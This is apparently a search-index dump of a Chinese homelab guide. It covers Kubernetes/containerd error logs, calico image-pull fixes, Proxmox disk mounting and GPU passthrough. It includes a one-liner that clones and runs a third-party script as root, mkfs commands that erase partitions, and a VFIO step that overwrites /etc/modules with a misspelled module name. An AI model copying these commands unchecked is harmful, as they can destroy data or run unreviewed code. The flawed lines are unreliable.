13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.549096    9760 kuberuntime_sandbox.go:72] \"Failed to create sandbox for pod\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\" pod=\"kube-system/kube-scheduler-k8s-master01\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.549145    9760 kuberuntime_manager.go:1237] \"CreatePodSandbox for pod failed\" err=\"rpc error: code = Unknown desc = failed to start sandbox \\\"f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b/log.json: no such file or directory): exec: \\\"runc\\\": executable file not found in $PATH\" pod=\"kube-system/kube-scheduler-k8s-master01\"\nMar 22 13:26:30 k8s-master01 kubelet[9760]: E0322 13:26:30.549256    9760 pod_workers.go:1301] \"Error syncing pod, skipping\" err=\"failed to \\\"CreatePodSandbox\\\" for \\\"kube-scheduler-k8s-master01_kube-system(c7ec3024ac27f675ae60ec998a90ce85)\\\" with CreatePodSandboxError: \\\"Failed to create sandbox for pod \\\\\\\"kube-scheduler-k8s-master01_kube-system(c7ec3024ac27f675ae60ec998a90ce85)\\\\\\\": rpc error: code = Unknown desc = failed to start sandbox \\\\\\\"f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b\\\\\\\": failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/f8b4188ebe49ae964cfbbb1837c3899194dede9e323889d10636e4002993581b/log.json: no such file or directory): exec: \\\\\\\"runc\\\\\\\": executable file not found in $PATH\\\"\" pod=\"kube-system/kube-scheduler-k8s-master01\" podUID=\"c7ec3024ac27f675ae60ec998a90ce85\"\nMar 22 13:26:31 k8s-master01 kubelet[9760]: E0322 13:26:31.073491    9760 event.go:368] \"Unable to write event (may retry after sleeping)\" err=\"Post \\\"https://192.168.11.161:6443/api/v1/namespaces/default/events\\\": dial tcp 192.168.11.161:6443: connect: connection refused\" event=\"&amp;Event{ObjectMeta:{k8s-master01.182f0852158da106  default    0 0001-01-01 00:00:00 +0000 UTC &lt;nil&gt; &lt;nil&gt; map[] map[] [] [] []},InvolvedObject:ObjectReference{Kind:Node,Namespace:,Name:k8s-master01,UID:k8s-master01,APIVersion:,ResourceVersion:,FieldPath:,},Reason:NodeHasSufficientPID,Message:Node k8s-master01 status is now: NodeHasSufficientPID,Source:EventSource{Component:kubelet,Host:k8s-master01,},FirstTimestamp:2025-03-22 13:18:49.45761511 +0800 CST m=+0.101712151,LastTimestamp:2025-03-22 13:18:49.45761511 +0800 CST m=+0.101712151,Count:1,Type:Normal,EventTime:0001-01-01 00:00:00 +0000 UTC,Series:nil,Action:,Related:nil,ReportingController:kubelet,ReportingInstance:k8s-master01,}\"\n</code></pre>"},{"location":"3/2/#714-kubernetscalicokubectl-get-pods-n-tigera-operatorpodimagepullbackoff","title":"7.1.4 Kubernets\u200b\u96c6\u7fa4\u200b\u4e2d\u200b\u90e8\u7f72\u200bcalico\u200b\u7f51\u7edc\u200b\u63d2\u4ef6\u200b\u65f6\u200bkubectl get pods -n tigera-operator\u200b\u547d\u4ee4\u200b\u4e00\u76f4\u200b\u663e\u793a\u200bpod\u200b\u4e3a\u200bImagePullBackOff\u200b\u72b6\u6001","text":"Bash<pre><code>~# kubectl describe pod tigera-operator-ccfc44587-vswlt -n tigera-operator\n</code></pre> Bash<pre><code>~# kubectl get pods -n tigera-operator -o wide\n</code></pre> <p>\u200b\u67e5\u200b\u5230\u200b\u201cFailed to pull image \"quay.io/tigera/operator:v1.36.5\": failed to pull and unpack image \"quay.io/tigera/operator:v1.36.5\": failed to copy: read tcp 192.168.11.166:53828-&gt;23.60.96.137:443: read: connection reset by peer \u201d \u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u62c9\u53d6\u200b\u955c\u50cf\u200b\u6216\u8005\u200b\u589e\u52a0\u200b\u955c\u50cf\u200b\u6e90\u200b\uff08\u200b\u53c2\u8003\u200bhttps://blog.csdn.net/nxg810251/article/details/145170594\u200b\u4e2d\u200b\u7684\u200bconfig.toml\u200b\u6587\u4ef6\u200b\u7684\u200bLine206~Line219\u200b\u4e2d\u200b\u7684\u200b\u914d\u7f6e\u200b\uff09 </p> Bash<pre><code>~# sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart containerd &amp;&amp; sudo systemctl restart kubelet\n</code></pre> Bash<pre><code>~# systemctl daemon-reload &amp;&amp; systemctl restart containerd\n</code></pre>"},{"location":"3/2/#7143","title":"7.1.4.3 \u200b\u53c2\u8003\u200b\uff1a","text":"<ul> <li>K8s\u200b\u7684\u200bPod\u200b\u51fa\u73b0\u200bInit:ImagePullBackOff\u200b\u95ee\u9898\u200b\u7684\u200b\u89e3\u51b3\u200b(\u200b\u4ee5\u200bcalico\u200b\u4e3a\u4f8b\u200b)</li> <li>Kubernetes1.32\u200b\u7248\u672c\u200b\u642d\u5efa\u200b\u3010\u200b\u8d85\u200b\u8be6\u7ec6\u200b\u3011</li> <li>Kubernetes1.32\u200b\u7248\u672c\u200b\u642d\u5efa\u200b\u3010\u200b\u6781\u200b\u7b80\u7248\u200b\u3011</li> </ul>"},{"location":"3/2/#_7","title":"\u516b\u200b\u3001 \u200b\u603b\u7ed3","text":""},{"location":"3/2/#81","title":"8.1 \u200b\u53ef\u4ee5\u200b\u7ee7\u7eed\u200b\u4f18\u5316\u200b\u7684\u200b\u6d41\u7a0b","text":""},{"location":"3/2/#811","title":"8.1.1 \u200b\u865a\u62df\u673a\u200b\u955c\u50cf\u200b\u51c6\u5907","text":""},{"location":"3/2/#812-containerd","title":"8.1.2 containerd\u200b\u7248\u672c\u200b\u9009\u62e9","text":""},{"location":"3/2/#813","title":"8.1.3 \u200b\u955c\u50cf\u200b\u6e90\u200b\u52a0\u901f","text":""},{"location":"3/2/#814","title":"8.1.4 \u200b\u7f51\u7edc\u200b\u914d\u7f6e","text":""},{"location":"4/1/","title":"\u6dfb\u52a0\u200b\u786c\u76d8","text":""},{"location":"4/1/#_1","title":"\u786c\u76d8\u200b\u5217\u8868","text":"<p>\u200b\u9996\u5148\u200b\u770b\u200b\u4e0b\u200b\u6211\u4eec\u200b\u7684\u200b\u786c\u76d8\u200b\u5217\u8868\u200b\uff1a</p> <p> </p> <p>\u200b\u4e0b\u9762\u200b\u5907\u6ce8\u200b\u4e00\u4e0b\u200b\u8fd9\u4e9b\u200b\u786c\u76d8\u200b\u7684\u200b\u4f5c\u7528\u200b\uff1a</p> \u200b\u8bbe\u5907\u200b\u540d\u200b \u200b\u534f\u8bae\u200b \u200b\u786c\u76d8\u200b\u578b\u53f7\u200b \u200b\u5bb9\u91cf\u200b \u200b\u5907\u6ce8\u200b /dev/nvme0n1 NVME GeIL \u200b\u91d1\u90a6\u200b P4L PCIe 4.0 1TB \u200b\u505a\u200b Windows \u200b\u6e38\u620f\u200b\u76d8\u200b\u76f4\u901a\u200b\u7528\u200b /dev/nvme1n1 NVME Fanxiang \u200b\u68b5\u60f3\u200b S500 PRO 1TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/nvme2n1 NVME WD \u200b\u897f\u200b\u6570\u200b SN570 * 2 \u200b\u7ec4\u200b RAID0 2TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/nvme3n1 NVME WD \u200b\u897f\u200b\u6570\u200b SN550 256GB PVE \u200b\u7684\u200b\u7cfb\u7edf\u76d8\u200b /dev/nvme4n1 NVME aigo \u200b\u7231\u56fd\u8005\u200b P3000Pro 1TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/sda SATA \u200b\u5e0c\u6377\u200b ST2000VX008 2TB \u200b\u76f4\u901a\u200b\u7ed9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u4f7f\u7528\u200b /dev/sdb SATA \u200b\u5e0c\u6377\u200b ST2000VX008 2TB \u200b\u76f4\u901a\u200b\u7ed9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u4f7f\u7528\u200b /dev/sdc SATA Micron \u200b\u9541\u5149\u200b M600 1TB \u200b\u76f4\u901a\u200b\u7ed9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u4f7f\u7528\u200b /dev/sdd SATA Fanxiang \u200b\u68b5\u60f3\u200b  FP325T 256GB PVE \u200b\u4e0b\u200b\u4f5c\u4e3a\u200b ISO \u200b\u955c\u50cf\u200b\u6a21\u677f\u200b /dev/sde SATA \u200b\u5e0c\u6377\u200b ST1000DM003 1TB \u200b\u76f4\u901a\u200b\u7ed9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u4f7f\u7528\u200b /dev/sdf SATA WDC \u200b\u897f\u200b\u6570\u200b WD10EZEX 1TB \u200b\u76f4\u901a\u200b\u7ed9\u200b\u9ed1\u200b\u7fa4\u6656\u200b\u4f7f\u7528"},{"location":"4/1/#_2","title":"\u786c\u76d8\u5206\u533a","text":"<p>\u200b\u4f7f\u7528\u200b fdisk \u200b\u547d\u4ee4\u200b\u5c06\u200b\u300c\u200b\u9700\u8981\u200b\u6302\u8f7d\u200b\u4e3a\u200b\u5230\u200b PVE \u200b\u4e0b\u200b\u5f53\u505a\u200b\u76ee\u5f55\u200b\u7684\u200b\u786c\u76d8\u200b\u300d\u200b\u5206\u533a\u200b\u6216\u8005\u200b Windows PE \u200b\u4e0b\u200b\u4f7f\u7528\u200b Diskgenius \u200b\u5c06\u200b\u8fd9\u4e9b\u200b\u786c\u76d8\u200b\u5206\u6210\u200b\u5355\u4e2a\u200b\u5206\u533a\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u7ec8\u200b\u6574\u7406\u200b\u7684\u200b\u5185\u5bb9\u200b\u5982\u4e0b\u200b\uff1a</p> \u200b\u5206\u533a\u200b \u200b\u534f\u8bae\u200b \u200b\u786c\u76d8\u200b\u578b\u53f7\u200b \u200b\u5bb9\u91cf\u200b \u200b\u5907\u6ce8\u200b /dev/nvme1n1p1 NVME Fanxiang \u200b\u68b5\u60f3\u200b S500 PRO 1TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/nvme2n1p1 NVME WD \u200b\u897f\u200b\u6570\u200b SN570 * 2 \u200b\u7ec4\u200b RAID0 2TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/nvme4n1p1 NVME aigo \u200b\u7231\u56fd\u8005\u200b P3000Pro 1TB \u200b\u6302\u8f7d\u200b\u4e3a\u200b PVE \u200b\u76ee\u5f55\u200b\u4f7f\u7528\u200b /dev/sdd1 SATA Fanxiang \u200b\u68b5\u60f3\u200b  FP325T 256GB PVE \u200b\u4e0b\u200b\u4f5c\u4e3a\u200b ISO \u200b\u955c\u50cf\u200b\u6a21\u677f"},{"location":"4/1/#_3","title":"\u6dfb\u52a0\u200b\u786c\u76d8","text":"Bash<pre><code># \u200b\u5c06\u200b \u200b\u4e0a\u8ff0\u200b\u5206\u533a\u200b \u200b\u683c\u5f0f\u5316\u200b\u4e3a\u200b ext4 \u200b\u683c\u5f0f\u200b\nmkfs -t ext4 /dev/nvme1n1p1\nmkfs -t ext4 /dev/nvme2n1p1\nmkfs -t ext4 /dev/nvme4n1p1\nmkfs -t ext4 /dev/sdd1\n\n# \u200b\u521b\u5efa\u200b\u5bf9\u5e94\u200b\u7684\u200b\u76ee\u5f55\u200b\nmkdir /mnt/ssd1-nvme-1tb-Fanxiang-S500PRO\nmkdir /mnt/ssd2-nvme-2tb-WD-AN1500\nmkdir /mnt/ssd3-nvme-1tb-AIGO-P3000PRO\nmkdir /mnt/ssd4-sata-256g-Fanxiang-FP325\n\n# \u200b\u5c06\u200b\u5206\u533a\u200b\u5bf9\u5e94\u200b\u6302\u8f7d\u200b\u5230\u200b\u76ee\u5f55\u200b\u4e0b\u200b\nmount -t ext4 /dev/nvme1n1p1 /mnt/ssd1-nvme-1tb-Fanxiang-S500PRO\nmount -t ext4 /dev/nvme2n1p1 /mnt/ssd2-nvme-2tb-WD-AN1500\nmount -t ext4 /dev/nvme4n1p1 /mnt/ssd3-nvme-1tb-AIGO-P3000PRO\nmount -t ext4 /dev/sdd1 /mnt/ssd4-sata-256g-Fanxiang-FP325\n\n# \u200b\u8bbe\u7f6e\u200b\u5f00\u673a\u200b\u81ea\u542f\u200b\u6302\u8f7d\u200b\necho /dev/nvme1n1p1 /mnt/ssd1-nvme-1tb-Fanxiang-S500PRO ext4 defaults 1 2 &gt;&gt; /etc/fstab\necho /dev/nvme2n1p1 /mnt/ssd2-nvme-2tb-WD-AN1500 ext4 defaults 1 2 &gt;&gt; /etc/fstab\necho /dev/nvme4n1p1 /mnt/ssd3-nvme-1tb-AIGO-P3000PRO ext4 defaults 1 2 &gt;&gt; /etc/fstab\necho /dev/sdd1 /mnt/ssd4-sata-256g-Fanxiang-FP325 ext4 defaults 1 2 &gt;&gt; /etc/fstab\n</code></pre> <p>\u200b\u6700\u540e\u200b\u6765\u5230\u200b Web UI \u200b\u754c\u9762\u200b\u300c\u200b\u6570\u636e\u4e2d\u5fc3\u200b\u300d-\u300c\u200b\u5b58\u50a8\u200b\u300d\u200b\u5c06\u200b\u4e0a\u8ff0\u200b\u6211\u4eec\u200b\u6302\u8f7d\u200b\u7684\u200b\u76ee\u5f55\u200b\u6dfb\u52a0\u200b\u5230\u200b PVE \u200b\u4e2d\u200b\u5e76\u200b\u52fe\u9009\u200b\u5168\u90e8\u5185\u5bb9\u200b\uff1a</p> <p> </p> <p>\u200b\u6700\u540e\u200b\u5168\u90e8\u200b\u6dfb\u52a0\u200b\u786c\u76d8\u200b\u5b8c\u6210\u200b\u540e\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p>"},{"location":"4/1/#_4","title":"\u7b80\u5355\u200b\u65b9\u6cd5\u200b\uff08\u200b\u8865\u5145\u200b\uff09","text":"<p>\u200b\u5176\u5b9e\u200b PVE Web \u200b\u91cc\u9762\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u70b9\u70b9\u200b\u70b9\u200b\u6dfb\u52a0\u200b\u786c\u76d8\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u66f4\u200b\u7b80\u5355\u200b\u4e00\u70b9\u200b\u3002\u200b\u9996\u5148\u200b\u64e6\u9664\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b\u7684\u200b\u786c\u76d8\u200b\uff1a</p> <p> </p> <p>\u200b\u7136\u540e\u200b\u627e\u5230\u200b\u300c\u200b\u76ee\u5f55\u200b\u300d\u200b\u9009\u62e9\u200b\u300c\u200b\u521b\u5efa\u200b\uff1a\u200b\u76ee\u5f55\u200b\u300d\u200b\u5373\u53ef\u200b\uff1a</p> <p> </p> <p>\u200b\u6dfb\u52a0\u200b\u7684\u200b\u6548\u679c\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> <p>\u200b\u9ed8\u8ba4\u200b\u4e3a\u200b\u7c7b\u578b\u200b\u4e3a\u200b VZDump\u200b\u5907\u4efd\u6587\u4ef6\u200b, \u200b\u78c1\u76d8\u200b\u6620\u50cf\u200b, ISO\u200b\u955c\u50cf\u200b, \u200b\u5bb9\u5668\u200b, \u200b\u7247\u6bb5\u200b, \u200b\u5bb9\u5668\u200b\u6a21\u677f\u200b\uff1a</p> <p> </p>"},{"location":"4/2/","title":"\u786c\u4ef6\u200b\u76f4\u901a","text":""},{"location":"4/2/#_1","title":"\u811a\u672c\u200b\u5b9e\u73b0","text":"<p>\u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b\u7684\u8bdd\u200b\uff0cGithub \u200b\u4e0a\u9762\u200b\u5df2\u7ecf\u200b\u6709\u200b\u6210\u719f\u200b\u7684\u200b\u811a\u672c\u200b\u4e86\u200b\u3002</p> <p>\u200b\u9879\u76ee\u200b\u5730\u5740\u200b\u4e3a\u200b\uff1ahttps://github.com/ivanhao/pvetools</p> <p>\u200b\u5728\u200b\u901a\u5916\u200b\u7f51\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4e00\u952e\u200b\u5b89\u88c5\u200b\u8fd0\u884c\u200b\uff0c\u200b\u64cd\u4f5c\u200b\u5341\u5206\u200b\u7b80\u5355\u200b\uff0c\u200b\u7ec6\u8282\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b\uff1a</p> Bash<pre><code>echo \"nameserver  8.8.8.8\" &gt;&gt; /etc/resolv.conf &amp;&amp; rm /etc/apt/sources.list.d/pve-enterprise.list &amp;&amp; export LC_ALL=en_US.UTF-8 &amp;&amp; apt update &amp;&amp; apt -y install git &amp;&amp; git clone https://github.com/ivanhao/pvetools.git &amp;&amp; cd pvetools &amp;&amp; ./pvetools.sh\n</code></pre>"},{"location":"4/2/#_2","title":"\u624b\u5de5\u200b\u5b9e\u73b0","text":"<p>\u200b\u4f46\u662f\u200b\uff0c\u200b\u65e2\u7136\u200b\u5199\u200b\u6559\u7a0b\u200b\u4e86\u200b\uff0c\u200b\u80af\u5b9a\u200b\u8fd8\u662f\u200b\u8981\u8bf4\u200b\u4e00\u4e0b\u200b\u5982\u4f55\u200b\u624b\u5de5\u200b\u914d\u7f6e\u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b\u3002</p>"},{"location":"4/2/#iommu","title":"\u68c0\u6d4b\u200b IOMMU \u200b\u662f\u5426\u200b\u5f00\u542f","text":"<p>\u200b\u5f00\u542f\u200b IOMMU \u200b\u540e\u200b\uff0cBIOS \u200b\u53ef\u4ee5\u200b\u6536\u96c6\u200b IOMMU \u200b\u786c\u4ef6\u200b\u76f8\u5173\u200b\u7684\u200b\u4fe1\u606f\u200b\u4ee5\u53ca\u200b\u5b83\u200b\u548c\u200b PCIe \u200b\u8bbe\u5907\u200b\u8fde\u63a5\u200b\u5173\u7cfb\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u68c0\u6d4b\u200b\u662f\u5426\u200b\u5f00\u542f\u200b\uff0c\u200b\u5982\u679c\u200b\u5f00\u542f\u200b IOMMU \u200b\u7684\u8bdd\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4e00\u4e9b\u200b PCIe \u200b\u786c\u4ef6\u200b\u8bbe\u5907\u200b\uff1a</p> Bash<pre><code>dmesg | grep -e DMAR -e IOMMU\n</code></pre> \u200b\u672a\u200b\u5f00\u542f\u200b IOMMU\u200b\u5f00\u542f\u200b IOMMU <p></p> <p> </p>"},{"location":"4/2/#iommu-sr-iov","title":"\u5f00\u542f\u200b IOMMU \u200b\u548c\u200b SR-IOV","text":"<p>IOMMU \u200b\u662f\u200b Intel VT-d \u200b\u548c\u200b AMD-Vi \u200b\u7684\u200b\u901a\u7528\u200b\u540d\u79f0\u200b\u3002</p> <p>\u200b\u5148\u200b\u5907\u4efd\u200b\u4e00\u4e0b\u200b grub \u200b\u6587\u4ef6\u200b\uff1a</p> Bash<pre><code>cp /etc/default/grub /etc/default/grub.bak\n</code></pre> <p>\u200b\u7136\u540e\u200b\u4fee\u6539\u200b <code>/etc/default/grub</code> \u200b\u6587\u4ef6\u200b\uff1a</p> Bash<pre><code>nano /etc/default/grub\n</code></pre> <p>\u200b\u5c06\u200b\uff1a<code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"</code> \u200b\u4e0b\u9762\u200b\u6211\u4eec\u200b\u4e3b\u8981\u200b\u6839\u636e\u200b\u81ea\u5df1\u200b\u7684\u200b\u5e73\u53f0\u200b\u6765\u200b\u4fee\u6539\u200b\u8fd9\u200b\u4e00\u884c\u200b\u914d\u7f6e\u200b\u3002</p> \u200b\u786c\u4ef6\u200b\u76f4\u901a\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u7528\u5230\u200b\u7684\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u53c2\u6570\u200b\u89e3\u91ca\u200b......  \u200b\u70b9\u51fb\u200b\u5c55\u5f00\u200b\u8868\u683c\u200b \ud83d\udc49 \u200b\u53c2\u6570\u200b \u200b\u89e3\u91ca\u200b\u8bf4\u660e\u200b quiet \u200b\u9ed8\u8ba4\u200b\u53c2\u6570\u200b\uff0c\u200b\u8868\u793a\u200b\u5728\u200b\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u53ea\u200b\u663e\u793a\u200b\u91cd\u8981\u200b\u4fe1\u606f\u200b intel_iommu=on \u200b\u7528\u200b intel_iommu \u200b\u9a71\u52a8\u200b\u6765\u200b\u9a71\u52a8\u200b IOMMU \u200b\u786c\u4ef6\u200b\u5355\u5143\u200b amd_iommu=on \u200b\u7528\u200b amd_iommu \u200b\u9a71\u52a8\u200b\u6765\u200b\u9a71\u52a8\u200b IOMMU \u200b\u786c\u4ef6\u200b\u5355\u5143\u200b iommu=pt \u200b\u53ea\u200b\u4e3a\u200b\u4f7f\u7528\u200b\u900f\u4f20\u200b\u529f\u80fd\u200b\u7684\u200b\u8bbe\u5907\u200b\u542f\u7528\u200b IOMMU\uff0c\u200b\u5e76\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b\u66f4\u597d\u200b\u7684\u200b\u529f\u80fd\u200b\u548c\u200b\u6027\u80fd\u200b pci=assign-busses \u200b\u90e8\u5206\u200b\u7f51\u5361\u200b\u5f00\u542f\u200b SR-IOV \u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b\uff0c\u200b\u5426\u5219\u200b\u53ef\u80fd\u200b\u62a5\u9519\u200b PCIe_acs_override=downstream \u200b\u7528\u4e8e\u200b\u5c06\u200b iommu groups \u200b\u62c6\u5206\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u7075\u6d3b\u200b\u6309\u200b\u9700\u200b\u76f4\u901a\u200b\u4e00\u4e9b\u200b\u677f\u8f7d\u200b\u7684\u200b\u8bbe\u5907\u200b PCIe_acs_override=multifunction PCIe \u200b\u76f4\u901a\u200b\u591a\u529f\u80fd\u200b\u652f\u6301\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u76f4\u901a\u200b\u5b8c\u7f8e\u200b\u5ea6\u200b\uff08\u200b\u53ef\u200b\u9009\u200b\uff09 nofb \u200b\u8be5\u200b\u9009\u9879\u200b\u5141\u8bb8\u200b\u4f60\u200b\u4e0d\u7528\u200b\u4e00\u4e2a\u200bframe\u200b\u7f13\u51b2\u200b\u6765\u200b\u4f7f\u7528\u200b\u56fe\u5f62\u200b\u5b89\u88c5\u7a0b\u5e8f\u200b textonly \u200b\u4ec5\u200b\u5728\u200b\u6587\u672c\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\u652f\u6301\u200b GRUB \u200b\u4e32\u884c\u200b\u63a7\u5236\u53f0\u200b nomodeset \u200b\u7cfb\u7edf\u542f\u52a8\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0c\u200b\u6682\u65f6\u200b\u4e0d\u200b\u8fd0\u884c\u200b\u56fe\u50cf\u200b\u9a71\u52a8\u7a0b\u5e8f\u200b video=vesafb:off \u200b\u7981\u7528\u200b vesa \u200b\u542f\u52a8\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b video=efifb:off \u200b\u7981\u7528\u200b efi \u200b\u542f\u52a8\u200b\u663e\u793a\u200b\u8bbe\u5907\u200b video=simplefb:off 5.15 \u200b\u5185\u6838\u200b\u5f00\u59cb\u200b\u76f4\u901a\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b initcall_blacklist=sysfb_init \u200b\u90e8\u5206\u200b A \u200b\u5361\u5982\u200b RX580 \u200b\u76f4\u901a\u200b\u5f02\u5e38\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b pcie_aspm=off \u200b\u5173\u95ed\u200b PCIe \u200b\u8bbe\u5907\u200b\u7684\u200b ASPM \u200b\u8282\u80fd\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u89e3\u51b3\u200b\u90e8\u5206\u200b PCIe \u200b\u8bbe\u5907\u200b AER \u200b\u62a5\u9519\u200b pcie_aspm=force \u200b\u5f3a\u5236\u200b PCIe \u200b\u8bbe\u5907\u200b\u53ca\u200b\u7231\u60c5\u200b ASPM \u200b\u8282\u80fd\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u89e3\u51b3\u200b\u90e8\u5206\u200b PCIe \u200b\u8bbe\u5907\u200b AER \u200b\u62a5\u9519\u200b pci=noaer \u200b\u4e0d\u200b\u8f93\u51fa\u200b AER \u200b\u62a5\u9519\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u534e\u5357\u200b\u4e3b\u677f\u200b\u7ecf\u5e38\u200b\u4f1a\u200b AER \u200b\u62a5\u9519\u200b\uff0c\u200b\u5efa\u8bae\u200b\u914d\u5408\u200b\u4f7f\u7528\u200b\uff0c\u200b\u773c\u4e0d\u89c1\u200b\u5fc3\u4e0d\u70e6\u200b pci=nomsi \u200b\u5728\u200b\u7cfb\u7edf\u200b\u8303\u56f4\u200b\u5185\u200b\u7981\u7528\u200b MSI \u200b\u4e2d\u65ad\u200b\uff0c\u200b\u4e3b\u8981\u200b\u8fd8\u662f\u200b\u89e3\u51b3\u200b PCIe \u200b\u76f8\u5173\u200b\u7684\u200b\u62a5\u9519\u200b pci=nommconf \u200b\u89e3\u51b3\u200b PCIe \u200b\u76f8\u5173\u200b\u7684\u200b\u62a5\u9519\u200b\uff0cPCIe Bus Error \u200b\u7b49\u200b\uff0c\u200b\u534e\u5357\u200b\u4e3b\u677f\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fd9\u4e2a\u200b\u53c2\u6570\u200b <ul> <li>Intel \u200b\u5e73\u53f0\u200b \u200b\u4fee\u6539\u200b\u4e3a\u200b\uff1a</li> </ul> INI<pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt textonly nomodeset nofb pci=noaer pcie_acs_override=downstream,multifunction\"\n</code></pre> <ul> <li>AMD \u200b\u5e73\u53f0\u200b \u200b\u4fee\u6539\u200b\u4e3a\u200b\uff1a</li> </ul> INI<pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet amd_iommu=on iommu=pt textonly nomodeset nofb pci=noaer pcie_acs_override=downstream,multifunction\"\n</code></pre> \u200b\u90e8\u5206\u200b\u663e\u5361\u200b\u5982\u200b RX580 \u200b\u76f4\u901a\u200b\u7684\u200b\u65f6\u5019\u200b\u7a0d\u5fae\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff0c\u200b\u5f97\u200b\u4f7f\u7528\u200b initcall_blacklist=sysfb_init \u200b\u66ff\u4ee3\u200b video \u200b\u7cfb\u5217\u200b\u53c2\u6570\u200b <p>INI<pre><code>GRUB_CMDLINE_LINUX_DEFAULT=\"quiet intel_iommu=on iommu=pt pci=assign-busses pcie_acs_override=downstream,multifunction nofb textonly nomodeset initcall_blacklist=sysfb_init\"\n</code></pre> \u200b\u5426\u5219\u200b\u5927\u200b\u6982\u7387\u200b\u4f1a\u200b\u5361\u200b Failed to mmap 0000:xxx:00.0 BAR 0. Performance may be slow</p> <p>\u200b\u6539\u5b8c\u200b\u4e4b\u540e\u200b\u66f4\u65b0\u200b\u4e00\u4e0b\u200b grub \u200b\u5e76\u200b\u91cd\u542f\u200b\uff1a</p> Bash<pre><code>update-grub &amp;&amp; reboot\n</code></pre> <p>\u200b\u4f7f\u7528\u200b\u5982\u4e0b\u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u662f\u5426\u200b\u62c6\u5206\u200b\u4e86\u200b iommu groups\uff1a</p> Bash<pre><code>ls -l /sys/kernel/iommu_groups/*/devices\n</code></pre> \u200b\u672a\u200b\u62c6\u5206\u200b iommu groups\u200b\u5df2\u200b\u62c6\u5206\u200b iommu groups <p></p> <p> </p>"},{"location":"4/2/#vfio","title":"\u6dfb\u52a0\u200b VFIO \u200b\u6a21\u5757","text":"<p>\u200b\u4e3a\u4e86\u200b\u6211\u4eec\u200b\u7684\u200b\u663e\u5361\u200b\u987a\u5229\u200b\u76f4\u901a\u200b\uff0c\u200b\u9700\u8981\u200b\u6dfb\u52a0\u200b VFIO \u200b\u6a21\u5757\u200b\u5230\u200b /etc/modules \u200b\u6587\u4ef6\u200b\u4e2d\u200b\uff1a</p> Bash<pre><code>echo \"vfio\" &gt; /etc/modules\necho \"vfio_iommu_type1s\" &gt;&gt; /etc/modules\necho \"vfio_pci\" &gt;&gt; /etc/modules\necho \"vfio_virqfd\" &gt;&gt; /etc/modules\n</code></pre> 